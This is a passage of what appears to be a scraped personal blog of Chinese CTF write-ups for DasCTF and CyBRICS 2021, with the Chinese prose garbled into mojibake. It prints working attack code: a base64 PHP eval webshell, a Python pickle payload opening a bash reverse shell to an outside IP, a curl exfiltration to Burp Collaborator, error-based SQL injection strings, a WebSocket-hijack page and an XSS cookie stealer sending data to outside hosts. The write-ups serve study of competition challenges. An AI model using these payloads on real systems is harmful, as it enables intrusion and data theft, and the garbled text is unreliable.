burpæˆ–è€…hackbarå°±ç›´æ¥è½¬äº†\n/qbl.php?id=wuhu.php%00a\u0026amp;url=http://baidu.com POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg== å‚è€ƒï¼šwp\neasyweb æœ‰ä¸€ä¸ªdockerçš„é™„ä»¶å’Œä¸€äº›æºç \né¦–é¡µå°±æ˜¯ä¸ªç™½åº•é»‘å­—çš„Hello Worldï¼Œå®¡ä¸‹æºç \nç›´æ¥æ‰“æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼ˆå› ä¸ºè¿™é‡Œæ¶‰åŠåˆ°sessionçš„è°ƒç”¨ æ‰€ä»¥åœ¨.vscodeä¸­çš„launch.jsonå¤„æ·»åŠ ä¸€ä¸ªconfiguration: \u0026quot;justMyCode\u0026quot;: falseè¿™æ ·å¯ä»¥åœ¨è°ƒç”¨å †æ ˆå¤„çœ‹åˆ°å®Œæ•´çš„è°ƒç”¨æƒ…å†µ\nå¯ä»¥æ³¨æ„åˆ°æ¯æ¬¡åˆ·æ–°ä¹‹å sessionçš„å€¼éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè°ƒè¯•çš„æ—¶å€™å¯ä»¥çœ‹åˆ°ç”Ÿæˆè¿™ä¸ªsessionæ—¶è°ƒç”¨äº†dumpsæ–¹æ³•ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜å°±æ˜¯ååºåˆ—åŒ–çš„å¥—è·¯å•¦\npayloadæœ‰ä¸¤ç§å§ åå¼¹shell æˆ–è€…æ„é€ post/getè¯·æ±‚åˆ°è‡ªå·±å¯ä»¥æ¥æ”¶åˆ°çš„å¹³å°ä¸Šï¼Œä¹Ÿéƒ½æ˜¯å¸¸è§„åšæ³•\nclass A: def __reduce__(self): cmd = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/175.24.73.30/2333 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; s=\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;{}\u0026#39;).read()\u0026#34;.format(cmd) return (eval,(s,)) #reduceå¿…é¡»è¿”å›å…ƒç»„æˆ–å­—ç¬¦ä¸² def hello_world(request): request.session[\u0026#34;233\u0026#34;] = \u0026#34;2333\u0026#34; request.session[\u0026#34;a\u0026#34;] = A() return Response(\u0026#39;Hello World!\u0026#39;) æ„é€ è¯·æ±‚çš„è¯è¿˜æ˜¯è€æœ‹å‹~~ burp collaborator~~\ncurl \u0026#34;xxxxxx.burpcollaborator.net/`readflag`\u0026#34; å‚è€ƒï¼šwp\neasyjava java æ ¹æœ¬ä¸ä¼š\næ”¾ä¸ªå‚è€ƒé“¾æ¥ æºœäº†ï¼šwp1 wp2\næœ€è¿‘åœ¨æ€»ç»“ååºåˆ—åŒ–æœ‰å…³çš„ä¸œè¥¿ï¼Œæƒ³æŠŠphp, python, javaçš„ååºåˆ—åŒ– åšè¿‡çš„ä¸œè¥¿æ€»ç»“æ€»ç»“ï¼Œä½†è¿˜æ˜¯æˆ‘æƒ³å¾—å¤ªç®€å•äº† ä¸€ä¸ªphpçš„ååºåˆ—åŒ–å°±æœ‰å¥½å¤šå¥½å¤šä¸œè¥¿ï¼ˆè£…æ­»ï¼‰\näº‰å–æ—©æ”¶å·¥å§ï¼Œè¿˜æœ‰upload, xss, csrf, sqli\u0026hellip;\u0026hellip;ç­‰ç€æ€»ç»“ è¿˜æœ‰è¶…çº§å¤šä¸œè¥¿è¦å­¦è¦çœ‹\nå­¦ä¹ å¥½è€¶ï¼Ïƒ`âˆ€Â´)\n","date":"2021-08-05T23:15:47+08:00","permalink":"https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/","section":"posts","tags":["wp"],"title":"DasCTF0721 Wp"},{"categories":["CTF"],"contents":"Mic Check (Cyber, Baby, 50 pts) Author: Vlad Roskov (@mrvos)\nThose organizers are changing game rules all the time! Thereâ€™s a flag there, and itâ€™s not that easy to capture.\nAlso be sure to join @cybrics Telegram chat for challenge-related announcements and contacting orgs in case all goes wrong\nAdded at 10:10 â€” looks like the little mic check trolling caused massive pain, Iâ€™ve untrolled the rules page :-) You can now copy-paste freely\nScanner (rebyC, Baby, 50 pts) Author: Mikhail Driagunov (@aethereternity)\nCheck out this cool new game!\nI heard they serve flags at level 5.\nä¸éš¾ï¼Œå°±æ˜¯æ¯”è¾ƒé¸¡è´¼ æŠŠå¥½å¥½çš„å›¾ç‰‡å¼„æˆçŠ¹æŠ±çµç¶åŠé®é¢\né¦–å…ˆç”¨Gif SuperæŠŠå¸§é—´éš”è°ƒä¸º300msï¼Œç„¶åè£å‰ªå‡ºä¸­é—´æœ‰ç”¨çš„éƒ¨åˆ† æ”¾å…¥GIFåŠ¨æ€å›¾ç‰‡åˆ†è§£ä¸­çœ‹ç»“æœ éƒ½æœ‰åœ¨çº¿å·¥å…·å°±å¾ˆæ–¹ä¾¿\næ‰€ä»¥è¿™ä¸ªç ´ç©æ„åˆ°åº•æ˜¯å•¥ï¼ŸçŒªï¼Ÿè¿˜æ˜¯åˆºçŒ¬ï¼Ÿ åˆ«çš„éƒ½è¿˜ç®—æ­£å¸¸å§ å°±æ˜¯éƒ½ä¸å¤ªåƒå…¶å® æœ‰star, goose, flag, flower, ring, house, bone\u0026hellip;. æœ€åä¸€ä¸ªæ˜¯äºŒç»´ç  æ¯”è¾ƒéº»çƒ¦\nå†ç¨å¾®è°ƒæ•´ä¸€ä¸‹å°ºå¯¸ï¼Œæ‰«æå°±è¡Œäº†\nrm -rfâ€™er (CTB, Baby, 166 pts) Author: Vlad Roskov (@mrvos)\nAlarm! We accidentally did rm -rf /* on a very important server. Now all thatâ€™s left is one shell session.\nssh rmrfer@178.154.210.26 Password: sa7Neiyi Rescue the flag.txt file from one of the directories by only using your shell\nAdded at 13:45 â€” frequent question: yes, if you found flag.txt, the flag is right there, in the open, as plain text. Just read it. If youâ€™re not seeing the flag, try to find another method that will not hide info from you\nè¿™ä¸ªé¢˜ emmmmm åªè¦sshä¸€è¿æ¥å°±ä¼šè‡ªåŠ¨æ‰§è¡Œrm -rf /*çš„æŒ‡ä»¤ï¼Œå½“ååº”è¿‡æ¥çš„æ—¶å€™ç³»ç»Ÿå·²ç»åˆ çš„è¿lsæŒ‡ä»¤éƒ½ä¸å‰©äº†\nå…ˆè¯´éé¢„æœŸè§£å§ï¼šå½“è¾“å…¥è¿æ¥å¯†ç åç«‹åˆ»ctrl+c åªè¦å¤Ÿå¿« å°±æ‰§è¡Œä¸äº†rm -rf /*ï¼Œä¹‹åå°±å¯ä»¥é¡ºç•…çš„ç©¿æ¢­äºè¿™ä¸ªbuildboxä¹‹é—´æ‹¿flagäº†\né¢„æœŸè§£åˆ™æ˜¯è¿™æ ·çš„ï¼šå½“ç³»ç»Ÿæ‰§è¡Œåˆ é™¤å‘½ä»¤å å¾ˆå¤šå¤–éƒ¨æŒ‡ä»¤éƒ½è¢«åˆ é™¤ éœ€è¦é€šè¿‡ä»…å‰©çš„ä¸€äº›å†…ç½®å‡½æ•°å®Œæˆ\u0026quot;read\u0026quot;çš„åŠŸèƒ½ï¼›ä»ä¹‹å‰çš„æŠ¥é”™ä¿¡æ¯å¯çŸ¥ buildboxä½¿ç”¨çš„æ˜¯tcshï¼Œåœ¨tcshä¸­echo $\u0026lt;å‘½ä»¤ç›¸å½“äºreadå‡½æ•°ï¼Œè¯»å…¥æ ‡å‡†è¾“å…¥å¹¶è¾“å‡ºï¼›tcshä¸­åŠ æ‹¬å·çš„å‘½ä»¤éƒ½ä¼šåœ¨å­shellä¸­è¿è¡Œï¼›æ„é€ payload (echo \u0026quot;$\u0026lt;\u0026quot;) \u0026lt; /etc/ctf/flag.txtï¼Œå³ è¯»å–flag.txtå¹¶è¾“å‡º\nAd Network (Web, Baby, 50 pts) Author: Alexander Menshchikov (@n0str)\nWe are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.\nAdnetwork website\nThere is a flag 1337 redirects deep into the network\u0026hellip;\nè¿™ä¸ªæˆ‘æ˜¯ä¸çŸ¥é“æ€ä¹ˆåšâ€¦â€¦é¡µé¢ä¸Šçš„ä»»ä½•é“¾æ¥éƒ¨åˆ†éƒ½æ˜¯è‡ªå·±é¡µé¢å†…çš„è·³è½¬ï¼Œæç¤ºçš„æ˜¯redirecté‡å®šå‘ï¼Œå¯æ˜¯æŠ“åŒ…åæ²¡æœ‰302 ä¹Ÿæ²¡æœ‰ä¸€ç›´åœ¨åšé‡å®šå‘å‘€ è¦æ€ä¹ˆçœ‹å‘¢ï¼Ÿ\nemmmm åœ¨æ¯”èµ›ç¬¬äºŒå¤©å†æ¬¡å°è¯•çš„æ—¶å€™ç”¨burpçš„è‡ªå¸¦çš„chromiumçš„æµè§ˆå™¨ï¼ˆä¹‹å‰æ˜¯çŸ¥é“è¿™ä¸ª ä½†æ˜¯æ²¡æœ‰ç”¨è¿‡ï¼‰æ¬¸ é¡µé¢å·¦ä¸Šè§’æ˜¾ç¤ºäº†ä¸€ä¸ªgifå›¾ è¿™ä¸ªå›¾åœ¨æ˜¨å¤©åšçš„æ—¶å€™çœ‹åˆ°ï¼Œ å†…å®¹æ˜¯ awesome ad from adnetworkï¼Œä½†æ˜¯edgeæµè§ˆå™¨åœ¨åŠ è½½è¿™ä¸ªå›¾çš„æ—¶å€™ä¼šè‡ªåŠ¨é˜»æ­¢ æˆ‘å•ç‹¬çœ‹äº†å†…å®¹ä¹Ÿæ²¡å‘ç°ä»€ä¹ˆç‰¹åˆ«çš„ å°±æ²¡æœ‰æ³¨æ„è¿™é‡Œã€‚äº‹åè§’åº¦çœ‹è¿™é‡Œ å…¶å®ä¸€ä¸ªGifå›¾è¢«é˜»æ­¢è¯·æ±‚åº”è¯¥æ˜¯å¾ˆåå¸¸çš„äº‹æƒ…ï¼Œåº”è¯¥é¦–å…ˆå¼•èµ·æ³¨æ„çš„\u0026hellip;\u0026hellip; ï¼ˆéƒ½æ€ªedge!!!\nç‚¹å‡»gifä¼šæœ‰å•ç‹¬çš„å¼¹çª—å‡ºæ¥ï¼Œæç¤ºé‡å®šå‘æ¬¡æ•°è¿‡å¤šï¼›çœ‹burpä¸­çš„æŠ“åŒ…è®°å½• ç¡®å®å¤šçš„ç¦»è°±ï¼ŒæŒ‰ç…§é¢˜ç›®ä¸­çš„æç¤º å¾—æœ‰1337å±‚ï¼Œå¾—ä¸Šä¸ªè„šæœ¬æ…¢æ…¢è·‘äº† è¿™ä¸ªæ¯”è¾ƒå¥½å¼„\nimport requests url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; for _ in range(1337): r = requests.get(url, allow_redirects=False) url = r.text[9:-18] print(url) emmm æ¯”è¾ƒæ…¢å…¶å® åº”è¯¥æœ‰åˆ«çš„çš„æ–¹å¼ï¼Ÿæœ€åçš„flagæ˜¯ cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}\næ¯”èµ›å®Œäº†çœ‹äº†åˆ«çš„wp è¿™å—å¯ä»¥ç”¨sessionè®¾å…è®¸é‡å®šå‘çš„æ¬¡æ•°ï¼Œè¿™æ ·æ›´æ–¹ä¾¿\nimport requests session = requests.Session() session.max_redirects = 1337 url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; r = session.get(url, allow_redirects=True) print(r.text) print(r.url) Announcement (Web, Easy, 60 pts) Author: Alexander Menshchikov (@n0str)\nLadies and gentlemen!\nAllow us to introduce a brand new project â€” âš The Flag\nAnnouncement website\nç®€çº¦æ¼‚äº®çš„å‰ç«¯\næœ‰ä¸ªè¾“å…¥é‚®ç®±çš„æ¡†ï¼Œæäº¤ä¼šå‘é€ä¸€ä¸ªpostè¯·æ±‚ï¼šdigest=xxxx\u0026amp;email=xxxx å°è¯•ä¸€ä¸ª1@1.comï¼Œé‡æ”¾çš„æ—¶å€™ç›´æ¥ä¿®æ”¹emailå€¼ä¼šæç¤ºInvalid digestï¼Œå‘ç°å…¶ä¸­digestçš„å€¼å°±æ˜¯md5(\u0026lsquo;1@1.com\u0026rsquo;) éšemailè€Œæ”¹å˜ï¼Œå°è¯•æ³¨å…¥\ndigest=76af11f3eaf7b12e72d7d88e4cf2ee01\u0026amp;email=\u0026#39;or\u0026#39;1\t// å›æ˜¾æ­£å¸¸ æ— æŠ¥é”™ digest=c3593d255957d60d5d489ae682da8aee\u0026amp;email=1\u0026#39;)#\t// æŠ¥é”™ï¼šSomething went wrong during database insert: Column count doesn\u0026#39;t match value count at row 1 digest=5c07c683d062d17ec799fa177ce88058\u0026amp;email=1\u0026#39;,1)#\t// æŠ¥é”™ï¼šSomething went wrong during database insert: Incorrect datetime value: \u0026#39;1\u0026#39; for column \u0026#39;timestamp\u0026#39; at row 1 ç¡®å®šæ˜¯sqli å¹¶ä¸”å½“å‰è¡¨æœ‰ä¸¤åˆ— email+timestampï¼Œä½¿ç”¨çš„è¯­å¥åº”è¯¥æ˜¯è¿™ä¸ªå§ï¼Ÿ\ninsert into table_name (email, timestamp) values (email, now()); å¯åˆ©ç”¨çš„éƒ¨åˆ†æ˜¯å¯ä»¥æ’å…¥çš„emailï¼ŒæŠ¥é”™æ³¨å…¥\ndigest=e1e79bd6fafe38f7073ec1f3ef1513fa\u0026amp;email=1\u0026#39;,1 or updatexml(1,concat(0x7e,database()),0))#\t// Something went wrong during database insert: XPATH syntax error: \u0026#39;~announcement\u0026#39; digest=c9f14624524736a74164cc6024fdefce\u0026amp;email=\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;announcement\u0026#39;)),0) or \u0026#39;\t// Something went wrong during database insert: XPATH syntax error: \u0026#39;~emails,logs\u0026#39; digest=94707222b90505ab0aa5e1fd3916e77d\u0026amp;email=\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;announcement\u0026#39; and table_name=\u0026#39;logs\u0026#39;)),0) or \u0026#39;\t// Something went wrong during database insert: XPATH syntax error: \u0026#39;~log\u0026#39; digest=66bf6db11d9bee8e897b874a430f5704\u0026amp;email=\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or \u0026#39;\t// Something went wrong during database insert: XPATH syntax error: \u0026#39;~cybrics{1N53r7_0ld_900d_5ql}\u0026#39; æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç»å…¸æŠ¥é”™æ³¨å…¥æµç¨‹ï¼šç¡®å®šå­—æ®µæ•°-\u0026gt;çˆ†æ•°æ®åº“å(announcement)-\u0026gt;è¡¨å(emails, logs)-\u0026gt;å­—æ®µå(log)-\u0026gt;å…·ä½“æ•°æ® æ‹¿flag\nMultichat (Web, Medium, 138 pts) Author: Alexander Menshchikov (@n0str)\nYet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.\nTip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): \u0026ldquo;Hey, i forgot the flag. Can you remind me?\u0026rdquo;. Then admin will tell him the flag.\nMultichat website\nTeam token for the support call: p32vhJKrnx_hajUc8nLTFw\nèŠå¤©å®¤ï¼Œadminå’Œtech supportåœ¨ä¸€ä¸ªç§˜å¯†çš„èŠå¤©å®¤å†…ï¼ˆ10ä½æ•°å­—çš„æˆ¿é—´å·ï¼‰ï¼Œtech supportå¯ä»¥è®©adminç»™å‡ºflagï¼ˆåé¢é‚£ä¸ªteam token for the support callæ˜¯è¦ç”¨åˆ°å—è¿˜æ˜¯æ€ä¹ˆæ ·\næŠ“åŒ…ï¼Œçœ‹åˆ°äº†Connection: Upgrade Upgrade: websocketï¼Œè¿™ä¸ªèŠå¤©å®¤æ˜¯å»ºç«‹äº†ä¸€ä¸ªwebsocketè¿æ¥\nï¼ˆwebsocketè¿™å—çŸ¥è¯†å°è±¡ä¸­ä¹‹å‰æ¥è§¦è¿‡ä¸€æ¬¡ ä¹Ÿå°±ä¸€æ¬¡ ç›¸å…³é“¾æ¥è¿˜æ˜¯æ”¾åé¢\né“¾æ¥é‡Œçš„ä¸€ä¸ªcsrfæ”»å‡»çš„å®ä¾‹è·Ÿè¿™ä¸ªæœ‰ç‚¹åƒäº†\nä½†æ˜¯è¿™é‡Œçš„åˆä¸å¤ªä¸€æ ·ï¼Œwebsocketæœ€åˆå»ºç«‹æ—¶çš„httpéƒ¨åˆ† cookieä¸­æœ‰chatroomçš„idï¼Œè¿™ä¸ªå€¼æ˜¯æœªçŸ¥çš„ï¼ˆAdmin and tech support are members of a secret chat room.ï¼‰ï¼›å¦å¤–tech supportæ˜¯å…ˆä¼šå‘*â€˜Hey, i forgot the flag. Can you remind me?â€™*ï¼Œéœ€è¦çš„æ˜¯è§¦å‘ï¼ˆå¦‚æœå®ƒä¸ä¼šè‡ªå·±å‘è¿™ä¸€æ¡å†…å®¹çš„è¯ï¼‰å’Œç›‘å¬å®ƒçš„ä¿¡æ¯ ç„¶åæ•æ‰åˆ°å®ƒçš„ä¸‹ä¸€æ¡adminå‘é€çš„å†…å®¹ï¼Œæ‹¿åˆ°flag\nï¼ˆæ¯”èµ›çš„æ—¶å€™å°±æƒ³åˆ°è¿™é‡Œï¼Œå…·ä½“çš„å®ç°ä¸çŸ¥é“è¯¥æ€ä¹ˆå¼„äº†ï¼Œä»¥ä¸‹æ˜¯çœ‹äº†wpä¹‹åçš„å¤ç°ï¼‰\n5000ç«¯å£å¤„æœ‰Supporté¡µé¢ï¼Œtech supportåœ¨è¿™é‡Œå¯ä»¥è®¿é—®ä»»æ„çš„é¡µé¢å¹¶å»ºç«‹websocketå‘é€æ¶ˆæ¯ï¼Œä¸é™åˆ¶è·¨åŸŸ æ‰€ä»¥å¯ä»¥å°†è‡ªå·±çš„ç½‘ç«™å†™åˆ°è¿™é‡Œï¼Œsupportä¼šå¸¦ç€å®ƒçš„cookieï¼ˆå’Œadminåœ¨ä¸€ä¸ªæˆ¿é—´é‡Œ cookieæ˜¯æˆ¿é—´idï¼‰è¿‡æ¥è®¿é—®ï¼Œç„¶åå€ŸåŠ©jsçš„è„šæœ¬æ‹¿åˆ°å®ƒçš„cookieï¼›ä»¥ä¸‹æ˜¯æ¥è‡ªw\u0026amp;mçš„è„šæœ¬\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var conn; function connect() { conn = new WebSocket(\u0026#34;ws://multichat-cybrics2021.ctf.su/ws\u0026#34;); conn.onclose = function (evt) { var item = \u0026#34;\u0026#34;; if (evt.code === 1003) { item = `Status: ${evt.reason}`; } else { item = \u0026#34;Connection closed.\u0026#34;; } fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(item)) }; conn.onopen = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(\u0026#34;connected\u0026#34;)) }; conn.onmessage = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(evt.data)) }; function b(){ conn.send(\u0026#34;Hey, i forgot the flag. Can you remind me?\u0026#34;) } setTimeout(b,2000); } window.onload = function () { connect(); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;html\u0026gt; æˆ–è€…éé¢„æœŸè§£ï¼šåœ¨urléƒ¨åˆ†è¿›è¡Œxssï¼Œpayload: javascript:location.href='http://vps/?cookie='+document.cookieï¼ˆæ­¤å¤„ç”¨çš„æ˜¯burp collaboratorï¼‰ç›´æ¥å¯ä»¥è·å–æˆ¿é—´å·ï¼Œè¿å…¥æˆ¿é—´åå‘æ¶ˆæ¯å³å¯æ‹¿åˆ°flag\nå‚è€ƒï¼šHTML5 WebSocket | WebSocketå®‰å…¨é—®é¢˜åˆ†æ WebSocketæ–­å¼€åŸå› åˆ†æ | Request.mode ä½¿ç”¨ Fetch | WorkerOrGlobalScope.fetch() | Burpsuite Collaboratoræ¨¡å—è¯¦è§£ | Running Your Instance of Burp Collaborator Serverï¼ˆåˆ—å…¥å¾…å®Œæˆè®¡åˆ’\nASCII Terminal (Network, Baby, 116 pts) Author: Artur Khanov (@awengar)\nAt 138.68.83.253:3333 you have an ASCII terminal. It really works, check with the id command\nncè¿ä¸Šä»¥åå¯ä»¥çœ‹åˆ°ä¸€ä¸ªbash $ï¼Œé¢˜ç›®çš„æç¤ºæ˜¯\u0026quot;ASCII termial\u0026quot;\næŠŠè¦æ‰§è¡Œçš„å‘½ä»¤ä¹Ÿè¡¨ç¤ºæˆè¿™ç§å½¢å¼åå‘é€å³å¯ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯linuxä¸‹çš„toiletå·¥å…·\ntoiletå¯ä»¥æŠŠå­—æ¯æ‹¼æˆç”¨å­—ç¬¦æˆ–å…¶ä»–æ–¹å¼è¡¨ç¤ºçš„æ›´å¤§çš„å­—æ¯ï¼Œå¯ä»¥å¸¦ä¸€äº›å‚æ•°æ¥æ§åˆ¶å­—ä½“ å­—å·ä»¥åŠæ ·å¼ æ¯”å¦‚\nå¯ä»¥ç©å‡ºå¾ˆå¤šèŠ±æ ·~\nä¹¦å½’æ­£é¢˜ï¼Œè¿™é‡Œä½¿ç”¨toilet -f bigascii9 +commandçš„å‘½ä»¤ç”Ÿæˆç»“æœï¼Œå°†ç©ºæ ¼æ¢ä¸º .å†å‘é€å³å¯\ntoilet -f bigascii9 ls \u0026gt; ls.txt cat ls.txt | nc 138.68.83.253 3333 \u0026gt; ls_result.txt toilet -f bigascii9 \u0026#39;cat flag.txt\u0026#39; \u0026gt; cat.txt cat cat.txt | nc 138.68.83.253 2333 \u0026gt; flag.txt ï¼ˆå€¼å¾—æ³¨æ„çš„æ˜¯ å¦‚æœç›´æ¥ä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤ç”Ÿæˆç›¸åº”æ–‡ä»¶åç”¨vimç¼–è¾‘å™¨çš„%s/\\s/./gå‘½ä»¤æ¥è¿›è¡Œç©ºæ ¼çš„æ›¿æ¢ï¼Œä¼šå‡ºç°ä¸‹é¢è¿™æ ·çš„æƒ…å†µ é¦–éƒ¨å’Œå°¾éƒ¨éƒ½éœ€è¦æ‰‹åŠ¨ä¿®æ­£ä¸€ä¸‹\næœ€åflagï¼šcybrics{T3553R4C7_15_GOOD}\nâ€”â€”â€”â€”psï¼šåœ¨èµ›åçš„å®˜æ–¹youtubeç›´æ’­è®²è§£ä¸­å±•ç¤ºäº†è¿™ä¸ªascii terminalçš„æºç ï¼Œæ˜¯ä½¿ç”¨pythonç¼–å†™çš„ å¯¹è¿™ä¸ªterminalçš„è¿è¡Œæ„Ÿå…´è¶£çš„å¯ä»¥åˆ°å½•æ’­è§†é¢‘ä¸­çœ‹\nå‚è€ƒï¼šè°ƒçš®æ£è›‹çš„Linuxä¸‹æœ‰è¶£ç»ˆç«¯çš„åˆé›† | Linux Fun - å¦‚ä½•åœ¨ç»ˆç«¯ä¸­åˆ›å»ºASCIIæ–‡æœ¬æ¨ªå¹… | Neofetch - æ˜¾ç¤ºå…·æœ‰åˆ†å‘æ ‡å¿—çš„Linuxç³»ç»Ÿä¿¡æ¯\nLX-100 (Network, Easy, 192 pts) Author: Vlad Roskov (@mrvos)\nWe were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.\nAnyway, we were discussing CyBRICS flags there, hope thereâ€™s no way to leak them.\nlx100.pcap\nï¼ˆè¯´å®è¯ï¼ŒpacpåŒ…æ˜¯çœŸçš„ä¸ä¼šçœ‹TAT\né¦–å…ˆçœ‹åˆ°æœ‰HTTPçš„æµé‡ï¼Œè®¿é—®çš„æ˜¯http://192.168.54.1/cam.cgi?mode=getstateï¼Œè¿™æ˜¯Lumix GX80æ‘„åƒå¤´ï¼Œè§†é¢‘æµé€šè¿‡UDPä¼ è¾“ï¼›è¿½è¸ªUDPæµé‡ï¼Œå¯¼å‡ºæµé‡ å¹¶æ‰¹é‡æå–å‡ºå…¶ä¸­çš„jpgæ–‡ä»¶ ï¼ˆä»¥ä¸‹æ˜¯å®˜æ–¹ç»™å‡ºçš„è§£ ä½¿ç”¨äº†tsharkå·¥å…·ï¼ˆå³å‘½ä»¤è¡Œç‰ˆçš„wireshrkï¼ˆä½†æ˜¯è¿™ç§æ–¹æ³•æœ¬åœ°å¤ç°å¤±è´¥ å¯¼å‡ºçš„jpgæ— æ³•æ­£å¸¸è§£æ ä½†æ˜¯å®˜æ–¹è§†é¢‘ä¸­ç¡®å®è¿™æ ·å¯ä»¥æˆåŠŸ emmmm\ntshark -r lx100.pcap -Y \u0026#39;udp.dstport == 60524\u0026#39; -Tfields -e data.data \u0026gt; hex.txt php -a foreach(file(\u0026#34;hex.txt\u0026#34;)as $i =\u0026gt; $ln) {file_put_contents(\u0026#34;frame$i.jpg\u0026#34;,hex2bin(trim($ln)));} ï¼ˆä»¥ä¸‹æ˜¯åœ¨åˆ«çš„wpä¸­çœ‹åˆ°çš„pyè„šæœ¬ï¼š å¯æˆåŠŸå¤ç° å¯¼å‡º455å¼ jpgå›¾\nimport pyshark cap = pyshark.FileCapture(\u0026#39;lx100.pcap\u0026#39;) count = 0 for packet in cap: if \u0026#34;UDP\u0026#34; in packet and int(packet[\u0026#39;udp\u0026#39;].srcport) == 65415: count = count + 1 udp_bytes = bytearray.fromhex(packet.data.data[packet.data.data.find(\u0026#39;ffd8ffdb\u0026#39;):]) file_out = open(\u0026#39;out_files/\u0026#39; + str(count) + \u0026#39;_packet.jpg\u0026#39;, \u0026#39;wb\u0026#39;) file_out.write(udp_bytes) æ”¾å¤§ å†æ”¾å¤§ æ¯ä¸€æ ¹ æœ€åçš„flagæ˜¯ cybrics{Lost_Secrets_In_The_AIr}\nlocalhost (Network, Hard, 267 pts) Author: Vlad Roskov (@mrvos)\nRemember NET fleeks? Iâ€™ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.\nssh localhost@109.233.61.10 Password: ohx7eeQu Your team token \u0026gt; Sw0T5cecsfJfaKApOiKzsA\nå…ˆsshè¿ä¸Šçœ‹çœ‹æƒ…å†µï¼ˆå›¾ä¸­æœ‰ä¸€å¥å‘½ä»¤è¾“é”™äº† åº”è¯¥æ˜¯routes ç•™ä¸‹äº†è‹±è¯­ä¸å¥½çš„æ³ªæ°´\nè‡ªå¸¦python2 python3 nmapï¼Œå¹¶ä¸”æœ¬èº«å°±æ˜¯rootèº«ä»½ï¼Œæ‰«ä¸€ä¸‹å†…ç½‘ç½‘æ®µnmap -sS -Pn 10.193.10.7/24\nå‘ç°10.193.10.180çš„80ç«¯å£å¼€æ”¾ï¼Œç”¨curlè®¿é—®\næç¤ºFlag-containing-Records æ¥ç€è®¿é—®ä¸¤ä¸ªè¶…é“¾æ¥çš„å†…å®¹\ncurl 10.193.10.180/redis.confæ˜¯redisçš„é…ç½®æ–‡ä»¶ï¼Œå‡ ä¹æ‰€æœ‰çš„å†…å®¹éƒ½æ˜¯è¢«æ³¨é‡Šæ‰çš„ç¤ºä¾‹å†…å®¹ï¼Œæœ‰ç”¨çš„å°±å†…å®¹å¹¶ä¸å¤šï¼š\nbind 127.0.0.1 protected-mod yes port 6379 curl 10.193.10.180/sysctl.confä¹Ÿæ˜¯ç›¸å…³çš„é…ç½®æ–‡ä»¶ åªæœ‰ä¸€å¥æ²¡è¢«æ³¨é‡Š\nnet.ipv4.conf.all.route_localnet=1 æŸ¥googleï¼Œå‘ç°äº†è¿™äº›ï¼šnet.ipv4.conf.all.route_localnet=1 opens security issue #90259 | POC-2020-8558\næ˜¯ä¸€ä¸ªå»å¹´çˆ†å‡ºçš„cveï¼Œå…·ä½“çš„å†…å®¹ æˆå› ä»¥åŠèƒŒæ™¯çŸ¥è¯†ä¸å¤šèµ˜è¿° ä¸Šé¢çš„é“¾æ¥ä¸­å†™çš„å¾ˆè¯¦ç»†ï¼Œè¿™é‡Œæ‘˜å–å‡ æ®µï¼š\nIn order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the net.ipv4.conf.all.route_localnet=1 sysctl setting. According to the kernel documentation, this setting makes the kernel \u0026ldquo;not consider loopback addresses as martian\u0026rdquo; \u0026ndash; a consequence of which is that they could be accessed by other nodes on the network. That\u0026rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!\n\u0026hellip;\u0026hellip;\nA normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting net.ipv4.conf.all.route_localnet=1 changes that \u0026ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.\nSo, if an attacker has a local connection to a target node with net.ipv4.conf.all.route_localnet=1, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.\nNote that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker\u0026rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting 